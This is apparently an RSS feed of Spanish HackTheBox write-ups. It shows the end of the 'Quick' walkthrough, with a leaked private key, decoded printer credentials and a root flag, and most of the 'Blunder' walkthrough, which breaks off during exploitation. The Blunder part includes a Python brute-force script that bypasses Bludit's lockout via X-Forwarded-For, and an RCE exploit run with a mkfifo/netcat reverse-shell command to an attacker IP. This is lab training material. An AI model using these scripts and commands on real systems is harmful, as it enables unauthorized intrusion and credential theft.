bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
+DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA=
-----END RSA PRIVATE KEY-----
VA#            
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora nos conectamos como el usario &lt;code&gt;srvadm&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ chmod 600 id_rsa
❯ ssh -i id_rsa srvadm@10.10.10.186
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jun 17 01:32:15 UTC 2023

  System load:  0.18              Users logged in:                0
  Usage of /:   73.4% of 7.75GB   IP address for ens33:           10.10.10.186
  Memory usage: 17%               IP address for docker0:         172.17.0.1
  Swap usage:   0%                IP address for br-9ef1bb2e82cd: 172.18.0.1
  Processes:    191


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

52 packages can be updated.
27 updates are security updates.


Last login: Fri Mar 20 05:56:02 2020 from 172.16.118.129
srvadm@quick:~$ whoami
srvadm
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro los dos directios del usuario &lt;code&gt;srvadm&lt;/code&gt;, encontramos un archivo de configuración y al leerlo encontramos unas credenciales.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;srvadm@quick:~/.cache$ find .
.
./conf.d
./conf.d/printers.conf
./conf.d/cupsd.conf
./logs
./logs/debug.log
./logs/error.log
./logs/cups.log
./packages
./motd.legal-displayed
srvadm@quick:~/.cache$ cat ./conf.d/printers.conf
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
State Idle
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Si ahora lo urldecodeamos para verlo mejor obtenemos unas nuevas credenciales que corresponden al usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ php --interactive
Interactive mode enabled

php &amp;gt; echo urldecode(&quot;MakeModel KONICA MINOLTA C554SeriesPS(P)
php &quot; DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
php &quot; State Idle&quot;);
MakeModel KONICA MINOLTA C554SeriesPS(P)
DeviceURI https://srvadm@quick.htb:&amp;amp;ftQ4K3SGde8?@printerv3.quick.htb/printer
State Idle
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo unico que tenemos que hacer ahora es dirigirnos al directorio del usuario &lt;code&gt;root&lt;/code&gt; y visualizar la segunda flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;srvadm@quick:~/.cache$ su root
Password: 
root@quick:/home/srvadm/.cache# whoami
root
root@quick:/home/srvadm/.cache# cd /root/
root@quick:~# cat root.txt 
914fef2cca09448887142468da0f2136
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Maquina bastante guapa! 😃&lt;/p&gt;

</description>
        <pubDate>Fri, 16 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Quick</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Quick</guid>
        
        <category>http3</category>
        
        <category>Information leaked</category>
        
        <category>Bruteforce</category>
        
        <category>XSS Injection Esigate</category>
        
        <category>change password db</category>
        
        <category>Abusing Printer</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Blunder - htb writeup</title>
        <description>&lt;p&gt;Hoy vamos a resolver la máquina &lt;code&gt;Blunder&lt;/code&gt; de la plataforma de &lt;code&gt;hackthebox&lt;/code&gt; correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt; dificultad facil, la cual explotaremos obteniendo información lekeada y obteniendo credenciales a partir de un ataque de fuerza bruta usando una tecnica de bypass, una vez dispongamos de las credenciales podremos vulnerar el gestor &lt;code&gt;BLUDIT CMS&lt;/code&gt; que corre la maquina, donde a traves de RCE ganaremos acceso a la maquina y finalmente para escalar privilegios aprovecharemos de una versión vulnerable de &lt;code&gt;sudo&lt;/code&gt; con la que conseguiremos acceso como el usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Maquina interesante asi que a darle!&lt;/p&gt;

&lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Blunder
❯ ls
 Blunder
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.191
PING 10.10.10.191 (10.10.10.191) 56(84) bytes of data.
64 bytes from 10.10.10.191: icmp_seq=1 ttl=63 time=265 ms

--- 10.10.10.191 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 265.087/265.087/265.087/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;63&lt;/code&gt;correspondiente a una maquina &lt;code&gt;linux&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.191 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 18:55 GMT
Initiating SYN Stealth Scan at 18:55
Scanning 10.10.10.191 [65535 ports]
Discovered open port 80/tcp on 10.10.10.191
Completed SYN Stealth Scan at 18:55, 26.57s elapsed (65535 total ports)
Nmap scan report for 10.10.10.191
Host is up, received user-set (0.13s latency).
Scanned at 2023-06-14 18:55:12 GMT for 26s
Not shown: 65533 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.70 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 21 (920B)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Solamente vemos que se encuentra abierto el puerto &lt;code&gt;80 http&lt;/code&gt;.&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p80 10.10.10.191 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 19:00 GMT
Nmap scan report for 10.10.10.191
Host is up (0.13s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts
|_http-generator: Blunder

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.64 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;80&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.41&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos usando &lt;code&gt;whatweb&lt;/code&gt;, para enumerar las tecnologias que emplea el servicio web, desde consola.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.191
http://10.10.10.191 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.191], JQuery, MetaGenerator[Blunder], Script, Title[Blunder | A blunder of interesting facts], X-Powered-By[Bludit]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La herramienta nos reporta que se el gestor de contenido del servicio web corresponde a un &lt;code&gt;bludit CMS&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Bludit: Bludit es una aplicación web para construir tu propio sitio web o blog en segundos, es completamente gratis y de código abierto&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Seguidmente vamos abrir la web en el navegador.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Observamos que a simple vista la pagina no muestra contenido interesante. Por ello intentaremos enumerar rutas expuestas del servicio con la herramienta &lt;code&gt;wfuzz&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/xmendez/wfuzz&quot;&gt;https://github.com/xmendez/wfuzz&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.191/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000000026:   200        105 L    303 W      3280 Ch     &quot;about&quot;                                                                                                               
000000259:   301        0 L      0 W        0 Ch        &quot;admin&quot;                                                                                                               
000000124:   200        170 L    918 W      7561 Ch     &quot;0&quot;                                                                                                                   
000002551:   200        110 L    387 W      3959 Ch     &quot;usb&quot;                                                                                                                 
000003295:   200        21 L     171 W      1083 Ch     &quot;LICENSE&quot;      
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de unos instantes &lt;code&gt;wfuzz&lt;/code&gt; nos reporta rutas validas, en las cuales podemos ver una de &lt;code&gt;admin&lt;/code&gt; y si vamos a esa ruta nos redirige a un panel de inicio de sesión.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora vamos a tratar de validar si existe una ruta &lt;code&gt;robots.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que efectivamente existe, ahora haciendo un poco de guesing quiero pensar que existen otros archivo con la extensión &lt;code&gt;.txt&lt;/code&gt; en las rutas, asi que nuevamente con &lt;code&gt;wfuzz&lt;/code&gt; vamos a validar si existen.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ.txt
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.191/FUZZ.txt
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                               
=====================================================================

000001765:   200        1 L      4 W        22 Ch       &quot;robots&quot;                                                                                                              
000002495:   200        4 L      23 W       118 Ch      &quot;todo&quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Podemos ver que ademas del robots.txt, existe un archivo &lt;code&gt;todo.txt&lt;/code&gt; y si lo visualizamos en el navegador obtenemos un usuario &lt;code&gt;fergus&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder4.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora volvamos a el panel de logeo y interceptemos la petición que se realiza con la ayuda de &lt;code&gt;burpsuite&lt;/code&gt; y el &lt;code&gt;foxyproxy&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder5.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos abrimos &lt;code&gt;burpsuite&lt;/code&gt; y vemos como se transmite la petición.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder6.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que se envia una petición &lt;code&gt;POST&lt;/code&gt; con algunos parametros, incluidos un &lt;code&gt;Token CSRF&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Ahora ya que disponemos de un usuario valido podriamos tratar de mediante un ataque de fuerza bruta obtener la contrasena, pero para ello necesitamos usar un diccionario de contraseñas.&lt;/p&gt;

&lt;p&gt;Anterirmente vimos que la pagina web contenia bastante texto, por que podriamos tratar e hacer un diccionario con las palabras usadas, para ello usaremos la herramienta &lt;code&gt;cewl&lt;/code&gt; y al pasarle la ip de la web podemos crearnos un diccionario en base a sus palabras y lo exportaremos en un fichero de nombre &lt;code&gt;dictionary.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ cewl -w dictionary.txt http://10.10.10.191
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
❯ ls
 dictionary.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;AHora que disponemos de un usuario valido &lt;code&gt;fergus&lt;/code&gt; y de un diccionario de posibles contraseñas &lt;code&gt;dictionary.txt&lt;/code&gt;, podemos crearnos un script en &lt;code&gt;python&lt;/code&gt; para automatizar el proceso de fuerza bruta y averiguar la contraseña valida.&lt;/p&gt;

&lt;p&gt;Llamaremos a nuestro &lt;code&gt;exploit&lt;/code&gt; bludit.py.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3


from pwn import *
import requests, re


def def_handler(sig, frame):
    print(&quot;\n[!]Saliendo...!\n&quot;)
    sys.exit(1)

#ctrl_c
signal.signal(signal.SIGINT, def_handler)
#variables_globales
main_url = &quot;http://10.10.10.191/admin/&quot;


def makeRequests():

    s = requests.session()

    passwords = open(&quot;dictionary.txt&quot;, 'r')

    p1 = log.progress(&quot;Fuerza Bruta&quot;)
    p1.status(&quot;Iniciando proceso de Fuerza Bruta&quot;)
    time.sleep(2)

    counter = 1

    for password in passwords.readlines():
        
        password = password.strip('\n')
       
        p1.status(&quot;Probando con la password [%d/349]: %s&quot; % (counter, password))

        r = s.get(main_url)

        tokenCSRF = re.findall(r'name=&quot;tokenCSRF&quot; value=&quot;(.*?)&quot;', r.text)[0]

        post_data = {
                &quot;tokenCSRF&quot;: tokenCSRF,
                &quot;username&quot;: &quot;fergus&quot;,
                &quot;password&quot;: password,
                &quot;save&quot;: ''
        }


        r = s.post(main_url, data=post_data)
        counter += 1

        if &quot;Username or password incorrect&quot; not in r.text:
            p1.success(&quot;La contraseña es %s&quot; % password)
            sys.exit(0)

if __name__=='__main__':

    makeRequests()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el exploit y despues de unos segundos nos valida que la contraseña es: &lt;code&gt;King&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 prueba.py
[+] Fuerza Bruta: La contraseña es King
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Probamos a logearnos en el servicio y vemos que las credenciales son incorrectas, ademas vemos un mensaje que nos dice que nuestra ip fue bloqueada.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder8.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Investigando un poco vemos que existe una forma de bypasear el uso de fuerza bruta en &lt;code&gt;Bludit&lt;/code&gt;, atraves de la cabezera &lt;code&gt;X-Forwarded-For&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://rastating.github.io/bludit-brute-force-mitigation-bypass/&quot;&gt;https://rastating.github.io/bludit-brute-force-mitigation-bypass/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Modificamos nuestro exploit y añadismos la cabezera &lt;code&gt;X-Forwarded-For&lt;/code&gt;, con el valor de nuestra variable &lt;code&gt;password&lt;/code&gt;, aprovechando que este por cada iteración sera aleatorio,&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;#!/usr/bin/python3

from pwn import *
import requests, re


def def_handler(sig, frame):
    print(&quot;\n[!]Saliendo...!\n&quot;)
    sys.exit(1)

#ctrl_c
signal.signal(signal.SIGINT, def_handler)
#variables_globales
main_url = &quot;http://10.10.10.191/admin/&quot;


def makeRequests():

    s = requests.session()

    passwords = open(&quot;dictionary.txt&quot;, 'r')

    p1 = log.progress(&quot;Fuerza Bruta&quot;)
    p1.status(&quot;Iniciando proceso de Fuerza Bruta&quot;)
    time.sleep(2)

    counter = 1
    for password in passwords.readlines():
        
        password = password.strip('\n')
        
        p1.status(&quot;Probando con la paassword [%d / 349] %s&quot; % (counter, password))

        r = s.get(main_url)

        tokenCSRF = re.findall(r'name=&quot;tokenCSRF&quot; value=&quot;(.*?)&quot;', r.text)[0]

        post_data = {
                &quot;tokenCSRF&quot;: tokenCSRF,
                &quot;username&quot;: &quot;fergus&quot;,
                &quot;password&quot;: password,
                &quot;save&quot;: ''
        }

        myHeaders = {
            'X-Forwarded-For': password
        }

        r = s.post(main_url, data=post_data, headers=myHeaders)
        counter += 1

        if &quot;Username or password incorrect&quot; not in r.text:
            p1.success(&quot;La contraseña es %s&quot; % password)
            sys.exit(0)

if __name__=='__main__':

    makeRequests()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de unos instantes logramos obtener la contraseña del usuario &lt;code&gt;fergus:RolandDeschain&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 bludit.py
[.] Fuerza Bruta: Probando con la password the
[+] Fuerza Bruta: La contraseña es RolandDeschain
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Validamos la contraseña en la pagina de logeo y ganamos acceso a un panel de dashboard.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blunder/blunder7.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si ahora buscamos vulnerabilidades asociadas a &lt;code&gt;bludit&lt;/code&gt;, encontramos un exploit en python asociado &lt;code&gt;Directory Traversal&lt;/code&gt; que deriva en ejecución remota de comandos.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit bludit
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                       |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Bludit - Directory Traversal Image File Upload (Metasploit)                                                                                          | php/remote/47699.rb
Bludit 3.13.1 - 'username' Cross Site Scripting (XSS)                                                                                                | php/webapps/50529.txt
Bludit 3.9.12 - Directory Traversal                                                                                                                  | php/webapps/48568.py
Bludit 3.9.2 - Auth Bruteforce Bypass                                                                                                                | php/webapps/48942.py
Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                                                                                         | php/webapps/49037.rb
Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass                                                                                           | php/webapps/48746.rb
Bludit 3.9.2 - Directory Traversal                                                                                                                   | multiple/webapps/48701.txt
bludit Pages Editor 3.0.0 - Arbitrary File Upload                                                                                                    | php/webapps/46060.txt
----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Nos traemos el exploit y al ejecutarlo nos pide algunos parametros&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ searchsploit -m php/webapps/48568.py
  Exploit: Bludit 3.9.12 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/48568
     Path: /usr/share/exploitdb/exploits/php/webapps/48568.py
File Type: Python script, ASCII text executable, with very long lines

Copied to: /home/fmiracle/Git/firtsmiracle.github.io/assets/images/HTB/htb-writeup-Blunder/48568.py
❯ mv 48568.py exploit_bludit.py
❯ python3 exploit_bludit.py


╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝

 CVE-2019-16113 CyberVaca


usage: exploit_bludit.py [-h] -u URL -user USER -pass PASSWORD -c COMMAND
exploit_bludit.py: error: the following arguments are required: -u, -user, -pass, -c
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos el exploit con los parametros correspondientes y con &lt;code&gt;-c&lt;/code&gt; especificamos el comandos que deseamos ejecutar, para ello probaremos enviarnos una traza a nuestra maquina.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 exploit_bludit.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'ping 10.10.16.4'


╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝

 CVE-2019-16113 CyberVaca


[+] csrf_token: 56c6bb6a8ba8cb234b81e3fc60794fa537f591c6
[+] cookie: tg456638i906rknr4n27it5kr3
[+] csrf_token: 0208621fe6b05f215d6f16a7675200b78af3cd2b
[+] Uploading tdbdwfqf.jpg
[+] Executing command: ping 10.10.16.4
[+] Delete: .htaccess
[+] Delete: tdbdwfqf.jpg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y vemos que recibimos la traza en nuestro equipo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
20:48:34.774870 IP 10.10.10.191 &amp;gt; 10.10.16.4: ICMP echo request, id 4083, seq 1, length 64
20:48:34.774896 IP 10.10.16.4 &amp;gt; 10.10.10.191: ICMP echo reply, id 4083, seq 1, length 64
20:48:35.702537 IP 10.10.10.191 &amp;gt; 10.10.16.4: ICMP echo request, id 4083, seq 2, length 64
20:48:35.702583 IP 10.10.16.4 &amp;gt; 10.10.10.191: ICMP echo reply, id 4083, seq 2, length 64
20:48:36.774871 IP 10.10.10.191 &amp;gt; 10.10.16.4: ICMP echo request, id 4083, seq 3, length 64
20:48:36.774913 IP 10.10.16.4 &amp;gt; 10.10.10.191: ICMP echo reply, id 4083, seq 3, length 64
20:48:37.615149 IP 10.10.10.191 &amp;gt; 10.10.16.4: ICMP echo request, id 4083, seq 4, length 64
20:48:37.615194 IP 10.10.16.4 &amp;gt; 10.10.10.191: ICMP echo reply, id 4083, seq 4, length 64
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lo siguiente sera mandaremos una reverse shell con la versión antigua de &lt;code&gt;ntcat&lt;/code&gt; haciendo uso de &lt;code&gt;mkfifo&lt;/code&gt; a nuestra maquina.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python3 exploit_bludit.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.16.4 443 &amp;gt;/tmp/f'


╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝

 CVE-2019-16113 CyberVaca


[+] csrf_token: cc25e735f2604125be5c2142412dbe2253a33fea
[+] cookie: a8c95lrdmos65m0545e9fflgh4
[+] csrf_token: 0f6fc1b9b0455869059adf72375ddcb9cef563bb
[+] Uploading rubnxlev.jpg
